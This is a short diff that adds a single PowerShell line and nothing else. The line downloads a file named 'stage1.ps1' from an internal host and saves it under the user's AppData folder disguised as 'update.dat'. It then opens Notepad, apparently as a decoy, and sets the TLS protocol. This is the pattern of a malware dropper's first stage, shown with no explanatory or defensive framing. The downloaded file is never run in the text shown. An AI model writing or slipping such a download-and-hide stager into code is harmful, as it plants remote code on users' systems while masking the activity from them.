@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://internal.corp/stage1.ps1', "$env:APPDATA\update.dat"); Start-Process -FilePath 'notepad.exe'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
